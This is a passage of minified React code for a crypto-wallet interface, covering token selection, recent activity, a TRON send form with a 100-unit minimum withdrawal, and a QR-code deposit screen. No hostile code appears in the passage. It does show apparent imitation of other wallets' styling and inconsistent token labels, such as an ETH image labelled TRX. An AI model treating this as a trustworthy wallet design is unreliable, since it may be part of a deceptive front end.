                                    })(), (0, r.jsxs)("div", {
                                        style: {
                                            flex: 1,
                                            overflowY: "auto",
                                            padding: "select" === eB ? "0 16px 16px" : "16px",
                                            display: "flex",
                                            flexDirection: "column"
                                        },
                                        children: ["select" === eB && (0, r.jsxs)("div", {
                                            children: [(0, r.jsx)("div", {
                                                style: {
                                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                    borderRadius: "20px",
                                                    padding: "12px 16px",
                                                    marginBottom: "16px",
                                                    border: "1px solid rgba(174,156,255,0.18)"
                                                },
                                                children: (0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "12px"
                                                    },
                                                    children: [(0, r.jsx)("svg", {
                                                        width: "20",
                                                        height: "20",
                                                        viewBox: "0 0 24 24",
                                                        fill: tH("--twc-iconNormal"),
                                                        children: (0, r.jsx)("path", {
                                                            d: "M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"
                                                        })
                                                    }), (0, r.jsx)("input", {
                                                        type: "text",
                                                        placeholder: "Search tokens",
                                                        value: eE,
                                                        onChange: e => eP(e.target.value),
                                                        style: {
                                                            flex: 1,
                                                            background: "rgba(255,255,255,0.55)",
                                                            border: "none",
                                                            color: tH("--twc-textPrimary"),
                                                            outline: "none",
                                                            fontSize: "16px",
                                                            fontWeight: 500
                                                        }
                                                    })]
                                                })
                                            }), (0, r.jsx)("div", {
                                                style: {
                                                    display: "flex",
                                                    flexDirection: "column",
                                                    gap: "8px"
                                                },
                                                children: e.map(e => {
                                                    let t = "USDT" === e.symbol && null !== e7 ? e7 : ty[e.symbol],
                                                        n = tr.length > 0,
                                                        o = "USDT" === e.symbol && "Ethereum" === e.network && !n,
                                                        i = 0 === t;
                                                    return (0, r.jsxs)("div", {
                                                        onClick: () => o ? (e => {
                                                            if (tr.length > 0) return void alert("You already have a pending transaction. Please wait for it to complete before initiating another.");
                                                            eb(e), eR("activity"), eS("")
                                                        })(e.symbol) : null,
                                                        style: {
                                                            display: "flex",
                                                            alignItems: "center",
                                                            padding: "12px 16px",
                                                            borderRadius: "20px",
                                                            cursor: o ? "pointer" : "not-allowed",
                                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                            gap: "12px",
                                                            transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                            opacity: i ? .5 : 1,
                                                            border: "1px solid rgba(174,156,255,0.18)"
                                                        },
                                                        onMouseEnter: e => {
                                                            o && (e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"))
                                                        },
                                                        onMouseLeave: e => {
                                                            o && (e.currentTarget.style.backgroundColor = tH("--twc-bg3"))
                                                        },
                                                        children: [(0, r.jsx)("div", {
                                                            style: {
                                                                width: "36px",
                                                                height: "36px"
                                                            },
                                                            children: (0, r.jsx)("img", {
                                                                src: tC[e.symbol],
                                                                alt: e.symbol,
                                                                style: {
                                                                    width: "100%",
                                                                    borderRadius: "50%",
                                                                    opacity: i ? .5 : 1
                                                                }
                                                            })
                                                        }), (0, r.jsxs)("div", {
                                                            style: {
                                                                flex: 1
                                                            },
                                                            children: [(0, r.jsx)("p", {
                                                                style: {
                                                                    color: tH("--twc-textPrimary"),
                                                                    margin: 0,
                                                                    fontSize: "16px",
                                                                    fontWeight: 600
                                                                },
                                                                children: e.symbol
                                                            }), (0, r.jsxs)("p", {
                                                                style: {
                                                                    color: tH("--twc-textSecondary"),
                                                                    margin: 0,
                                                                    fontSize: "13px",
                                                                    marginTop: "2px"
                                                                },
                                                                children: [e.name, " • ", e.network]
                                                            })]
                                                        }), (0, r.jsxs)("div", {
                                                            style: {
                                                                textAlign: "right"
                                                            },
                                                            children: [(0, r.jsx)("p", {
                                                                style: {
                                                                    color: tH("--twc-textPrimary"),
                                                                    margin: 0,
                                                                    fontSize: "16px",
                                                                    fontWeight: 600
                                                                },
                                                                children: t.toFixed(2)
                                                            }), (0, r.jsxs)("p", {
                                                                style: {
                                                                    color: tH("--twc-textSecondary"),
                                                                    margin: 0,
                                                                    fontSize: "13px",
                                                                    marginTop: "2px"
                                                                },
                                                                children: ["$", (t * (tb[e.symbol] || 0)).toFixed(2)]
                                                            })]
                                                        })]
                                                    }, e.symbol)
                                                })
                                            })]
                                        }), "activity" === eB && (() => {
                                            let e = tp.filter(e => e.token === ey).slice(0, 8),
                                                t = ty[ey];
                                            return (0, r.jsxs)("div", {
                                                style: {
                                                    flex: 1,
                                                    display: "flex",
                                                    flexDirection: "column"
                                                },
                                                children: [(0, r.jsxs)("div", {
                                                    style: {
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        borderRadius: "20px",
                                                        padding: "16px",
                                                        marginBottom: "20px",
                                                        border: "1px solid rgba(174,156,255,0.18)",
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "12px"
                                                    },
                                                    children: [(0, r.jsx)("div", {
                                                        style: {
                                                            width: "48px",
                                                            height: "48px",
                                                            borderRadius: "50%",
                                                            overflow: "hidden",
                                                            border: "1px solid rgba(174,156,255,0.18)"
                                                        },
                                                        children: (0, r.jsx)("img", {
                                                            src: tC[ey],
                                                            alt: ey,
                                                            style: {
                                                                width: "100%"
                                                            }
                                                        })
                                                    }), (0, r.jsxs)("div", {
                                                        style: {
                                                            flex: 1
                                                        },
                                                        children: [(0, r.jsx)("p", {
                                                            style: {
                                                                color: tH("--twc-textPrimary"),
                                                                margin: 0,
                                                                fontSize: "16px",
                                                                fontWeight: 600
                                                            },
                                                            children: ey
                                                        }), (0, r.jsxs)("p", {
                                                            style: {
                                                                color: tH("--twc-textSecondary"),
                                                                margin: "4px 0 0",
                                                                fontSize: "13px"
                                                            },
                                                            children: ["Balance: ", t.toFixed(2), " ", ey]
                                                        })]
                                                    })]
                                                }), (0, r.jsxs)("div", {
                                                    style: {
                                                        flex: 1,
                                                        overflowY: "auto",
                                                        marginBottom: "16px"
                                                    },
                                                    children: [(0, r.jsx)("p", {
                                                        style: {
                                                            color: tH("--twc-textSecondary"),
                                                            fontSize: "14px",
                                                            fontWeight: 600,
                                                            margin: "0 0 12px",
                                                            padding: "0 4px"
                                                        },
                                                        children: "Recent Activity"
                                                    }), (0, r.jsx)("div", {
                                                        style: {
                                                            display: "flex",
                                                            flexDirection: "column",
                                                            gap: "8px"
                                                        },
                                                        children: e.map(e => (0, r.jsxs)("div", {
                                                            style: {
                                                                display: "flex",
                                                                alignItems: "center",
                                                                padding: "12px",
                                                                borderRadius: "20px",
                                                                background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                                border: "1px solid rgba(174,156,255,0.18)",
                                                                gap: "12px"
                                                            },
                                                            children: [(0, r.jsx)("div", {
                                                                style: {
                                                                    width: "36px",
                                                                    height: "36px",
                                                                    borderRadius: "50%",
                                                                    backgroundColor: "received" === e.type ? "rgba(76, 175, 80, 0.1)" : "rgba(244, 67, 54, 0.1)",
                                                                    display: "flex",
                                                                    alignItems: "center",
                                                                    justifyContent: "center"
                                                                },
                                                                children: "received" === e.type ? (0, r.jsx)("svg", {
                                                                    width: "20",
                                                                    height: "20",
                                                                    viewBox: "0 0 24 24",
                                                                    fill: "#8B5CF6",
                                                                    children: (0, r.jsx)("path", {
                                                                        d: "M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"
                                                                    })
                                                                }) : (0, r.jsx)("svg", {
                                                                    width: "20",
                                                                    height: "20",
                                                                    viewBox: "0 0 24 24",
                                                                    fill: "#f44336",
                                                                    children: (0, r.jsx)("path", {
                                                                        d: "M19 9h-4V3H9v6H5l7-7 7 7zM5 18v2h14v-2H5z"
                                                                    })
                                                                })
                                                            }), (0, r.jsxs)("div", {
                                                                style: {
                                                                    flex: 1
                                                                },
                                                                children: [(0, r.jsx)("div", {
                                                                    style: {
                                                                        display: "flex",
                                                                        justifyContent: "space-between",
                                                                        marginBottom: "4px"
                                                                    },
                                                                    children: (0, r.jsxs)("p", {
                                                                        style: {
                                                                            color: tH("--twc-textPrimary"),
                                                                            fontSize: "14px",
                                                                            fontWeight: 600,
                                                                            margin: 0
                                                                        },
                                                                        children: ["received" === e.type ? "Received" : "Sent", " ", e.amount.toFixed(2), " ", e.token]
                                                                    })
                                                                }), (0, r.jsx)("p", {
                                                                    style: {
                                                                        color: tH("--twc-textSecondary"),
                                                                        fontSize: "12px",
                                                                        margin: 0,
                                                                        fontFamily: "monospace"
                                                                    },
                                                                    children: e.address
                                                                })]
                                                            })]
                                                        }, e.id))
                                                    })]
                                                }), (0, r.jsxs)("button", {
                                                    onClick: tD,
                                                    style: {
                                                        width: "100%",
                                                        padding: "16px",
                                                                    color: "#fff",
                                                        border: "none",
                                                        borderRadius: "20px",
                                                        fontSize: "16px",
                                                        fontWeight: 700,
                                                        cursor: "pointer",
                                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                        marginTop: "auto",
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        gap: "8px"
                                                    },
                                                    onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
                                                    onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
                                                    children: [(0, r.jsx)("svg", {
                                                        width: "20",
                                                        height: "20",
                                                        viewBox: "0 0 24 24",
                                                        fill: "#fff",
                                                        children: (0, r.jsx)("path", {
                                                            d: "M10.002 2.49903L15.8945 8.39158L14.4214 9.86472L11.0426 6.48597L11.0426 17.4998L8.95931 17.4998L8.95931 6.48697L5.58156 9.86472L4.10842 8.39158L10.001 2.49903L10.0015 2.49953L10.002 2.49903Z",
                                                            fill: "currentColor"
                                                        })
                                                    }), "Send ", ey]
                                                })]
                                            })
                                        })(), "send" === eB && (0, r.jsxs)("div", {
                                            style: {
                                                flex: 1,
                                                display: "flex",
                                                flexDirection: "column"
                                            },
                                            children: [(0, r.jsxs)("div", {
                                                style: {
                                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                    borderRadius: "20px",
                                                    padding: "16px",
                                                    marginBottom: "20px",
                                                    border: "1px solid rgba(174,156,255,0.18)",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    gap: "12px"
                                                },
                                                children: [(0, r.jsx)("div", {
                                                    style: {
                                                        width: "48px",
                                                        height: "48px",
                                                        borderRadius: "50%",
                                                        overflow: "hidden",
                                                        border: "1px solid rgba(174,156,255,0.18)"
                                                    },
                                                    children: (0, r.jsx)("img", {
                                                        src: tC[ey],
                                                        alt: ey,
                                                        style: {
                                                            width: "100%"
                                                        }
                                                    })
                                                }), (0, r.jsxs)("div", {
                                                    style: {
                                                        flex: 1
                                                    },
                                                    children: [(0, r.jsx)("p", {
                                                        style: {
                                                            color: tH("--twc-textPrimary"),
                                                            margin: 0,
                                                            fontSize: "16px",
                                                            fontWeight: 600
                                                        },
                                                        children: ey
                                                    }), (0, r.jsxs)("p", {
                                                        style: {
                                                            color: tH("--twc-textSecondary"),
                                                            margin: "4px 0 0",
                                                            fontSize: "13px"
                                                        },
                                                        children: ["Balance: ", ("USDT" === ey && null !== e7 ? e7 : 0).toFixed(2), " ", ey]
                                                    })]
                                                })]
                                            }), (0, r.jsxs)("div", {
                                                style: {
                                                    marginBottom: "20px"
                                                },
                                                children: [(0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        justifyContent: "space-between",
                                                        alignItems: "center",
                                                        marginBottom: "8px"
                                                    },
                                                    children: [(0, r.jsx)("label", {
                                                        style: {
                                                            color: tH("--twc-textSecondary"),
                                                            fontSize: "14px",
                                                            fontWeight: 500
                                                        },
                                                        children: "Amount"
                                                    }), (0, r.jsx)("button", {
                                                        onClick: tB,
                                                        style: {
                                                            background: "rgba(255,255,255,0.55)",
                                                            border: "none",
                                                            color: tH("--twc-primary"),
                                                            cursor: "pointer",
                                                            fontSize: "14px",
                                                            padding: "4px 8px",
                                                            borderRadius: "6px",
                                                            fontWeight: 600,
                                                            transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)"
                                                        },
                                                        onMouseEnter: e => e.currentTarget.style.backgroundColor = "rgba(143.9, 100, 64.1, 0.1)",
                                                        onMouseLeave: e => e.currentTarget.style.backgroundColor = "transparent",
                                                        children: "MAX"
                                                    })]
                                                }), (0, r.jsxs)("div", {
                                                    style: {
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        borderRadius: "20px",
                                                        padding: "16px",
                                                        border: "1px solid rgba(174,156,255,0.18)",
                                                        position: "relative"
                                                    },
                                                    children: [(0, r.jsx)("input", {
                                                        type: "number",
                                                        value: ev,
                                                        onChange: e => eS(e.target.value),
                                                        placeholder: "0.00",
                                                        disabled: eT,
                                                        style: {
                                                            width: "100%",
                                                            background: "rgba(255,255,255,0.55)",
                                                            border: "none",
                                                            color: tH("--twc-textPrimary"),
                                                            fontSize: "28px",
                                                            outline: "none",
                                                            fontWeight: 600,
                                                            fontFamily: "monospace",
                                                            paddingRight: "60px",
                                                            opacity: eT ? .6 : 1
                                                        }
                                                    }), (0, r.jsx)("div", {
                                                        style: {
                                                            position: "absolute",
                                                            right: "16px",
                                                            top: "50%",
                                                            transform: "translateY(-50%)",
                                                            display: "flex",
                                                            alignItems: "center",
                                                            gap: "8px"
                                                        },
                                                        children: (0, r.jsx)("span", {
                                                            style: {
                                                                color: tH("--twc-textPrimary"),
                                                                fontSize: "16px",
                                                                fontWeight: 600
                                                            },
                                                            children: ey
                                                        })
                                                    })]
                                                }), ev && 100 > parseFloat(ev) && (0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "6px",
                                                        marginTop: "8px"
                                                    },
                                                    children: [(0, r.jsx)("svg", {
                                                        width: "14",
                                                        height: "14",
                                                        viewBox: "0 0 24 24",
                                                        fill: "#f44336",
                                                        children: (0, r.jsx)("path", {
                                                            d: "M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
                                                        })
                                                    }), (0, r.jsxs)("p", {
                                                        style: {
                                                            color: "#f44336",
                                                            fontSize: "12px",
                                                            margin: 0,
                                                            fontWeight: 500
                                                        },
                                                        children: ["Minimum withdrawal amount is 100 ", ey]
                                                    })]
                                                })]
                                            }), (0, r.jsxs)("div", {
                                                style: {
                                                    marginBottom: "24px",
                                                    flex: 1
                                                },
                                                children: [(0, r.jsx)("label", {
                                                    style: {
                                                        color: tH("--twc-textSecondary"),
                                                        fontSize: "14px",
                                                        marginBottom: "8px",
                                                        display: "block",
                                                        fontWeight: 500
                                                    },
                                                    children: "Recipient Address"
                                                }), (0, r.jsx)("div", {
                                                    style: {
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        borderRadius: "20px",
                                                        padding: "16px",
                                                        border: "1px solid ".concat(ew ? eC ? "#8B5CF6" : "#f44336" : tH("--twc-line")),
                                                        transition: "border-color 0.3s ease"
                                                    },
                                                    children: (0, r.jsx)("textarea", {
                                                        value: ew,
                                                        onChange: e => (e => {
                                                            ej(e), tk.current && clearTimeout(tk.current);
                                                            let t = e.replace(/\s+/g, "");
                                                            t.startsWith("T") && 34 === t.length ? ek(tI(t)) : "" === t ? ek(!1) : tk.current = setTimeout(() => {
                                                                "" === t.trim() ? ek(!1) : ek(tI(t))
                                                            }, 300)
                                                        })(e.target.value),
                                                        placeholder: "T...",
                                                        disabled: eT,
                                                        style: {
                                                            width: "100%",
                                                            background: "rgba(255,255,255,0.55)",
                                                            border: "none",
                                                            color: tH("--twc-textPrimary"),
                                                            fontSize: "14px",
                                                            outline: "none",
                                                            fontFamily: "monospace",
                                                            fontWeight: 500,
                                                            resize: "none",
                                                            minHeight: "44px",
                                                            maxHeight: "44px",
                                                            lineHeight: "18px",
                                                            padding: "4px 0",
                                                            overflowY: "auto",
                                                            whiteSpace: "pre-wrap",
                                                            wordBreak: "break-all",
                                                            WebkitTextSizeAdjust: "100%",
                                                            touchAction: "manipulation",
                                                            opacity: eT ? .6 : 1
                                                        },
                                                        rows: 2,
                                                        maxLength: 42
                                                    })
                                                }), ew.trim() && !eC && (0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "6px",
                                                        marginTop: "8px"
                                                    },
                                                    children: [(0, r.jsx)("svg", {
                                                        width: "14",
                                                        height: "14",
                                                        viewBox: "0 0 24 24",
                                                        fill: "#f44336",
                                                        children: (0, r.jsx)("path", {
                                                            d: "M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
                                                        })
                                                    }), (0, r.jsx)("p", {
                                                        style: {
                                                            color: "#f44336",
                                                            fontSize: "12px",
                                                            margin: 0,
                                                            fontWeight: 500
                                                        },
                                                        children: "Invalid TRON address"
                                                    })]
                                                }), ew.trim() && eC && (0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "6px",
                                                        marginTop: "8px"
                                                    },
                                                    children: [(0, r.jsx)("svg", {
                                                        width: "14",
                                                        height: "14",
                                                        viewBox: "0 0 24 24",
                                                        fill: "#8B5CF6",
                                                        children: (0, r.jsx)("path", {
                                                            d: "M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"
                                                        })
                                                    }), (0, r.jsx)("p", {
                                                        style: {
                                                            color: "#8B5CF6",
                                                            fontSize: "12px",
                                                            margin: 0,
                                                            fontWeight: 500
                                                        },
                                                        children: "Valid TRON address"
                                                    })]
                                                })]
                                            }), (0, r.jsx)("div", {
                                                style: {
                                                    marginTop: "auto"
                                                },
                                                children: (0, r.jsx)("button", {
                                                    onClick: tA,
                                                    disabled: !tW || eT,
                                                    style: {
                                                        width: "100%",
                                                        padding: "16px",
                                                        backgroundColor: tW ? tH("--twc-primary") : tH("--twc-bg3"),
                                                        color: tW ? "#000" : tH("--twc-textDisabled"),
                                                        border: "none",
                                                        borderRadius: "20px",
                                                        fontSize: "16px",
                                                        fontWeight: 700,
                                                        cursor: tW ? "pointer" : "not-allowed",
                                                        opacity: eT ? .7 : 1,
                                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        gap: "8px"
                                                    },
                                                    onMouseEnter: e => {
                                                        tW && !eT && (e.currentTarget.style.backgroundColor = tH("--twc-primaryHover"))
                                                    },
                                                    onMouseLeave: e => {
                                                        tW && !eT && (e.currentTarget.style.backgroundColor = tH("--twc-primary"))
                                                    },
                                                    children: eT ? (0, r.jsxs)(r.Fragment, {
                                                        children: [(0, r.jsx)("div", {
                                                            style: {
                                                                width: "20px",
                                                                height: "20px",
                                                                border: "2px solid rgba(0,0,0,0.3)",
                                                                borderTopColor: "#000",
                                                                borderRadius: "50%",
                                                                animation: "spin 1s linear infinite"
                                                            }
                                                        }), "Processing..."]
                                                    }) : "Send"
                                                })
                                            })]
                                        }), "topup" === eB && (0, r.jsxs)("div", {
                                            style: {
                                                flex: 1,
                                                display: "flex",
                                                flexDirection: "column"
                                            },
                                            children: [(0, r.jsxs)("div", {
                                                style: {
                                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                    borderRadius: "20px",
                                                    padding: "24px",
                                                    marginBottom: "16px",
                                                    border: "1px solid rgba(174,156,255,0.18)",
                                                    textAlign: "center",
                                                    flex: 1,
                                                    display: "flex",
                                                    flexDirection: "column",
                                                    justifyContent: "center"
                                                },
                                                children: [(0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        gap: "12px",
                                                        marginBottom: "24px"
                                                    },
                                                    children: [(0, r.jsx)("div", {
                                                        style: {
                                                            width: "56px",
                                                            height: "56px",
                                                            borderRadius: "50%",
                                                            overflow: "hidden",
                                                            border: "1px solid rgba(174,156,255,0.18)"
                                                        },
                                                        children: (0, r.jsx)("img", {
                                                            src: tC.ETH,
                                                            alt: "ETH",
                                                            style: {
                                                                width: "100%"
                                                            }
                                                        })
                                                    }), (0, r.jsxs)("div", {
                                                        children: [(0, r.jsx)("p", {
                                                            style: {
                                                                color: tH("--twc-textPrimary"),
                                                                margin: 0,
                                                                fontSize: "20px",
                                                                fontWeight: 700
                                                            },
                                                            children: "TRX"
                                                        }), (0, r.jsx)("p", {
                                                            style: {
                                                                color: tH("--twc-textSecondary"),
                                                                margin: "4px 0 0",
                                                                fontSize: "16px"
                                                            },
                                                            children: "TRON"
                                                        })]
                                                    })]
                                                }), (0, r.jsx)("div", {
                                                    style: {
                                                        backgroundColor: "#fff",
                                                        borderRadius: "20px",
                                                        padding: "16px",
                                                        margin: "0 auto 20px",
                                                        width: "160px",
                                                        height: "160px",
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        border: "1px solid rgba(174,156,255,0.18)"
                                                    },
                                                    children: (0, r.jsx)("div", {
                                                        style: {
                                                            width: "130px",
                                                            height: "130px",
                                                            background: "url(https://api.qrserver.com/v1/create-qr-code/?size=130x130&data=".concat(encodeURIComponent(e0), ")"),
                                                            backgroundSize: "contain",
                                                            backgroundRepeat: "no-repeat",
                                                            backgroundPosition: "center"
                                                        }
                                                    })
                                                }), (0, r.jsxs)("div", {
                                                    style: {
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        borderRadius: "20px",
                                                        padding: "16px",
                                                        marginBottom: "16px",
                                                        border: "1px solid rgba(174,156,255,0.18)"
                                                    },
                                                    children: [(0, r.jsx)("p", {
                                                        style: {
                                                            color: tH("--twc-textSecondary"),
                                                            margin: "0 0 8px",
                                                            fontSize: "13px",
                                                            fontWeight: 500,
                                                            textAlign: "left"
                                                        },
                                                        children: "Your Wallet Address"
                                                    }), (0, r.jsxs)("div", {
                                                        style: {
                                                            display: "flex",
                                                            alignItems: "center",
                                                            gap: "12px"
                                                        },
                                                        children: [(0, r.jsx)("div", {
                                                            style: {
                                                                flex: 1,
                                                                overflow: "hidden",
                                                                minWidth: 0
                                                            },
                                                            children: (0, r.jsx)("p", {
                                                                style: {
                                                                    color: tH("--twc-textPrimary"),
                                                                    margin: 0,
                                                                    fontSize: "14px",
                                                                    fontFamily: "monospace",
                                                                    fontWeight: 500,
                                                                    whiteSpace: "nowrap",
                                                                    overflow: "hidden",
                                                                    textOverflow: "ellipsis"
                                                                },
                                                                children: e0
                                                            })
                                                        }), (0, r.jsx)("button", {
                                                            onClick: () => {
                                                                navigator.clipboard.writeText(e0), e_(!0), setTimeout(() => e_(!1), 2e3)
                                                            },
                                                            style: {
                                                                background: tH("--twc-bg3"),
                                                                border: "1px solid rgba(174,156,255,0.18)",
                                                                color: tH("--twc-textPrimary"),
                                                                cursor: "pointer",
                                                                fontSize: "14px",
                                                                padding: "8px 12px",
                                                                borderRadius: "18px",
                                                                fontWeight: 600,
                                                                width: "80px",
                                                                height: "36px",
                                                                transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                                display: "flex",
                                                                alignItems: "center",
                                                                justifyContent: "center",
                                                                gap: "6px",
                                                                flexShrink: 0
                                                            },
                                                            onMouseEnter: e => {
                                                                e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"), e.currentTarget.style.borderColor = tH("--twc-primary")
                                                            },
                                                            onMouseLeave: e => {
                                                                e.currentTarget.style.backgroundColor = tH("--twc-bg3"), e.currentTarget.style.borderColor = tH("--twc-line")
                                                            },
                                                            children: eH ? (0, r.jsx)("span", {
                                                                style: {
                                                                    fontSize: "14px",
                                                                    fontWeight: 600
                                                                },
                                                                children: "Copied"
                                                            }) : (0, r.jsxs)(r.Fragment, {
                                                                children: [(0, r.jsx)("svg", {
                                                                    width: "14",
                                                                    height: "14",
                                                                    viewBox: "0 0 24 24",
                                                                    fill: tH("--twc-textPrimary"),
                                                                    children: (0, r.jsx)("path", {
                                                                        d: "M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"
                                                                    })
                                                                }), (0, r.jsx)("span", {
                                                                    children: "Copy"
                                                                })]
                                                            })
                                                        })]
                                                    })]
                                                }), (0, r.jsxs)("button", {
                                                    onClick: () => {
                                                        J(!0), et("send")
                                                    },
                                                    style: {
                                                        width: "100%",
                                                        padding: "12px",
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        border: "1px solid rgba(174,156,255,0.18)",
                                                        borderRadius: "20px",
                                                        cursor: "pointer",
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        gap: "8px",
                                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                        marginTop: "8px"
                                                    },
                                                    onMouseEnter: e => {
                                                        e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"), e.currentTarget.style.borderColor = tH("--twc-primary")
                                                    },
                                                    onMouseLeave: e => {
                                                        e.currentTarget.style.backgroundColor = tH("--twc-bg3"), e.currentTarget.style.borderColor = tH("--twc-line")
                                                    },
                                                    children: [(0, r.jsx)("svg", {
                                                        width: "20",
                                                        height: "20",
                                                        viewBox: "0 0 24 24",
                                                        fill: tH("--twc-textPrimary"),
                                                        children: (0, r.jsx)("path", {
                                                            d: "M21 5H3V8H21V5ZM21 10.5H3V19H21V10.5ZM6 13H11V15.5H6V13ZM15.5 13H13V15.5H15.5V13Z"
                                                        })
                                                    }), (0, r.jsx)("span", {
                                                        style: {
                                                            color: tH("--twc-textPrimary"),
                                                            fontSize: "14px",
                                                            fontWeight: 600
                                                        },
                                                        children: "Buy ETH with Providers"
                                                    })]
                                                })]
                                            }), (0, r.jsx)("button", {
                                                onClick: () => eR("send"),
                                                style: {
                                                    width: "100%",
                                                    padding: "16px",
                                                    marginTop: "auto",
                                                    "data-phantom-primary": !0
                                                },
                                                onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
                                                onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
                                                children: "Done"
                                            })]
                                        })]
                                    })]
                                })
                            })()
                        }), eM && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                top: 0,
                                left: 0,
                                right: 0,
                                bottom: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9998,
                                padding: "16px",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (() => {
                                if ($) return tV();
